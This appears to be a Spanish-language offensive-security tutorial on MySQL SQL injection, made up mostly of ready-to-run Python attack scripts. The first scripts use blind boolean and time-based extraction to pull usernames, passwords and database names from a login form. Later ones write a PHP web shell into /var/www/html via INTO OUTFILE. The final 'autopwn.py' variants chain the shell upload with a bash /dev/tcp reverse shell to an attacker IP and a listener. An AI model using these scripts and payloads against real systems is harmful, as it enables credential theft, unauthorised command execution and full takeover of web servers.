# SQL Injection Script

Con el siguiente script de `python` podremos determinar el `username` del usuario en la tabla llamada `users` mediante `SQL Injection` con el tipo de base de datos `mysql` y la tecnica llamada `SQLI_Conditional`...

Para que funcione la barra de decoracion que se esta importando en el script hacemos lo siguiente...

```shell
pip install pwn
```

Una vez hecho eso, ejecutamos el script...

```python
#!/usr/bin/python3

from pwn import *
import requests, pdb, string, signal, sys, time

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://<IP>/<LOGIN>"
characters = string.ascii_lowercase + "-_"

def makeRequest():

        p1 = log.progress("Fuerza bruta")
        p1.status("Iniciando proceso de fuerza bruta")

        time.sleep(2)

        username = ""

        p2 = log.progress("Usuario")

        for position in range(1, 20):   #El rango de caracteres que pueda tener el usuario
                for character in characters:
                        post_data = {
                                'username' : "' or (select substring(username, %d,1) from users limit 1)='%s'-- -" % (position, character),     #Donde pone username de esta linea es el contenido de la tabla que en este caso se llama username que queremos descubrir ya que por defecto la tabla se llama asi, y la otra por defecto para saber en nombre de usuario es name la cual tambien tendriamos que probar, si no supieramos nada de esto, tendriamos que empezar explotando el nombre de la base de datos...
                                'password' : 'test'
                        }

                        p1.status(post_data['username'])

                        r = requests.post(login_url, data=post_data)

                        if r.text == "1":       #Parametro de la comparacion para saber si es True o False

                                username += character
                                p2.status(username)
                                break

if __name__ == '__main__':

        makeRequest()
```

Su funcion es determinar mediante un parametro en especifico el cual se tiene que cambiar dependiendo de las necesidades de cada uno, en este caso cuando el parametro de respuesta es un `1` significa que es correcto y cuando es `3` significa que es un `error`, por lo que el script se guia por ese parametro y entorno a eso va sacando el nombre letra por letra sabiendo que `1` es `True` y `3` es `False`, con eso se descubre el `username` del usuario, si se intenta descubrir mas alla del mismo se tendra que aumentar la inyeccion de codigo en el script conservando la funcion de ataque guiado por el parametro...

Si queremos sacar la `password` una vez sabiendo el nombre del usuario, modificaremos la inyeccion y añadiremos lo siguiente...

Para determinar por lo menos cual es el primer caracter de la `password` o la longitud de la misma se puede utilizar `BurpSuit` con el `Intruder` para ver aunque sea el primero y de ahi modificar el script a nuestra manera...

> EJEMPLO...

Suponiendo que el usuario sea `enemigosss` y la primera letra de la `password` sea la letra `s` para saber la longitud de la `password` haremos lo siguiente...

```mysql
' or (select substring(password, 1,1) from users where username='enemigosss' and length(password)>20)='s'-- -
```

Sabiendo lo larga que es pondremos ese signo `>=`...

```mysql
' or (select substring(password, 1,1) from users where username='enemigosss' and length(password)>20)>='s'-- -
```

Y una vez sabiendo la longitud, cambiaremos el script un poco para adaptarlo a nuestras nuevas necesidades...

```mysql
' or (select substring(password, %d,1) from users where username='enemigosss')='%s'-- -
```

El script adaptado...

```python
#!/usr/bin/python3

from pwn import *
import requests, pdb, string, signal, sys, time

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://<IP>/<LOGIN>"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeRequest():

        p1 = log.progress("Fuerza bruta")
        p1.status("Iniciando proceso de fuerza bruta")

        time.sleep(2)

        password = ""

        p2 = log.progress("Usuario")

        for position in range(1, 22):   #El rango de caracteres que pueda tener el usuario
                for character in characters:
                        post_data = {
                                'username' : "' or (select hex(substring(password, %d,1)) from users where username='enemigosss')=hex('%s')-- -" % (position, character),     #Donde pone hex() significa que estamos jugando con el formato hexadecimal para que nos detecte si es mayuscula o minuscula la letra y con sus respectibos simbolos...
                                'password' : 'test'
                        }

                        p1.status(post_data['username'])

                        r = requests.post(login_url, data=post_data)

                        if r.text == "1":       #Parametro de la comparacion para saber si es True o False

                                password += character
                                p2.status(password)
                                break

if __name__ == '__main__':

        makeRequest()
```

A parte si queremos saber como se llama la tabla que contiene ese usuario, podremos utilizar una tabla que suele venir por defecto en las bases de datos llamada `name` por lo que sustituimos `username` por `name`...

Si queremos sacar el nombre de la base de datos, tendremos que modificar la inyeccion de codigo de otra manera, por lo que el script se tendra que modificar a las necesidades de cada uno...

> EJEMPLO (NOMBRE BASE DE DATOS)

```python
#!/usr/bin/python3

from pwn import *
import requests, pdb, string, signal, sys, time

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://<IP>/<LOGIN>"
characters = string.ascii_lowercase + "-_"

def makeRequest():

        p1 = log.progress("Fuerza bruta")
        p1.status("Iniciando proceso de fuerza bruta")

        time.sleep(2)

        database = ""

        p2 = log.progress("Usuario")

        for position in range(1, 22):   #El rango de caracteres que pueda tener el usuario
                for character in characters:
                        post_data = {
                                'username' : "' or if(substr(database(),%d,1)='%s', sleep(5), 1)-- -" % (position, character),     #Aqui lo que hacemos es que mediantes sleep's y con la comparacion de si es 1 es True sacar el nombre de la base de datos...
                                'password' : 'test'
                        }

                        p1.status(post_data['username'])

						time_start = time.time()

                        r = requests.post(login_url, data=post_data)

						time_end = time.time()

                        if time_end - time_start > 5:       #Parametro de la comparacion para saber si es True o False con los tiempos de sleep's (Si tarda 5 segundos en responder es True, de lo contrario es False)

                                database += character
                                p2.status(database)
                                break

if __name__ == '__main__':

        makeRequest()
```

Pero para automatizar todo esto mas podremos utilizar la herramienta llamada `sqlmap` y con sus parametros necesarios dependiendo del tipo de ataque que queramos hacer...

### SQL Injection depositar archivos

Para aprovechar una vulnerabilidad de `mysql` en vez de para ver bases de datos, para poder cargar un archivo malicioso, probaremos si se puede haciendo lo siguiente...

> EJEMPLO

Pongamos que tenemos la siguiente `URL`...

```
URL = http://example.com/example.php
```

Y dentro de ese `.php` es vulnerable en algun `input` a `SQL Injection`, pondremos el siguiente comando para comprobar que se pueden subir archivos...

Supongamos que la ruta donde se esta ejecutando todo esto esta en la que viene por defecto `/var/www/html/` y si es asi, haremos lo suguiente...

```mysql
' UNION SELECT "<CONTENT_NAME>" INTO OUTFILE "/var/www/html/<FILE_NAME>.txt"-- -
```

Aplicado a nuestro caso...

```mysql
' UNION SELECT "example" INTO OUTFILE "/var/www/html/test.txt"-- -
```

Una vez hecho esto habremos creado el siguiente archivo con la palabra `example` en el archivo `test.txt` lo comprobaremos llendo a la siguiente ruta...

```
URL = http://example.com/test.txt
```

Info (contenido):

```
example
```

Por lo que vemos que funciona...

Vamos a crear un parametro llamado `cmd` para poder ejecutar comando de forma libre ya que interpreta `php` de la siguiente manera...

```mysql
' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/test.php"-- -
```

Por lo que una vez enviado esta peticion si nos vamos a la siguiente ruta donde deberia de estar...

```
URL = http://example.com/test.php
```

Nos deberia de aparecer una pagina en blanco o con algunos datos, pero que no seran importantes, una vez dentro de este archivo en la `URL` pondremos lo siguiente...

```
URL = http://example.com/test.php?cmd=<COMMAND>
```

> EJEMPLO

```
URL = http://example.com/test.php?cmd=whoami
```

Y si enviamos eso nos aparecera en este caso el nombre de usuario pintado en la pagina, por lo que vemos que funciona y ya podriamos explotarlo de muchas formas...

Si queremos automatizar todo esto con un script, haremos lo siguiente...

Llamaremos al archivo `autopwn.py`...

```python
#!/usr/bin/python3

from pwn import *
import signal, pdb, requests

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

#Ctlr+C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 3:
        log.failure("Uso: %s <ip-address> filename" % sys.argv[0])
        sys.exit(1)

# Varianles globales
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address

def createFile():

        data_post = {
                'username': 'admin',
                'country': """Brazil' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/%s"-- -""" % (filename)
        }

        r = requests.post(main_url, data=data_post)

if __name__ == '__main__':

        createFile()
```

Con este script de `python` ajustado a las necesidades de cada uno te creara un archivo en la `IP` que le indiques y si tuviera una ruta diferente despues de la `/` se modifica la parte de `main_url = "http://%s/" % ip_address` añadiendo despues de la `/` lo que sea necesario y los paraemtros de `username y country` igual...

Pero si a parte de crear el script quieres automatizarlo mas aun creando una `Reverse Shell` seguidamente, lo modficaremos haciendo lo siguiente...

```python
#!/usr/bin/python3

from pwn import *
import signal, pdb, requests

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

#Ctlr+C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 3:
        log.failure("Uso: %s <ip-address> filename" % sys.argv[0])
        sys.exit(1)

# Varianles globales
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address

def createFile():

        data_post = {
                'username': 'admin',
                'country': """Brazil' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/%s"-- -""" % (filename)
        }

        r = requests.post(main_url, data=data_post)

def getAccess():

        data_post = {
        'cmd': "bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"
        }

        r = requests.post(main_url + "%s" % filename, data=data_post)

if __name__ == '__main__':

        createFile()
        getAccess()
```

Tendremos que cambiar los parametros `<IP>` y `<PORT>` a nuestras necesidades para la `Reverse Shell`...

Pero cuando lo ejecutemos tendremos que estar a la escucha...

```shell
nc -lvnp <PORT>
```

Si por queremos automatizarlo todavia mas para que el propio script te de la shell directamente sin tu tener que estar a la escucha, haremos lo siguiente...

```python
#!/usr/bin/python3

from pwn import *
import signal, pdb, requests

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

#Ctlr+C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 3:
        log.failure("Uso: %s <ip-address> filename" % sys.argv[0])
        sys.exit(1)

# Varianles globales
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address
lport = <PORT>

def createFile():

        data_post = {
                'username': 'admin',
                'country': """Brazil' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/%s"-- -""" % (filename)
        }

        r = requests.post(main_url, data=data_post)

def getAccess():

        data_post = {
        'cmd': "bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"
        }

        r = requests.post(main_url + "%s" % filename, data=data_post)

if __name__ == '__main__':

        createFile()
        try:
                threading.Thread(target=getAccess, args=()).start()
        except Exception as e:
                log.error(str(e))

        shell = listen(lport, timeout=20).wait_for_connection()
        shell.interactive()
        getAccess()
```

En este caso ajustarlo a tu `IP` y `PUERTO` en lo dicho anteriormente y en la seccion de `lport = <PORT>` una vez ajustado esto y ejecutado tendremos una shell interactiva...
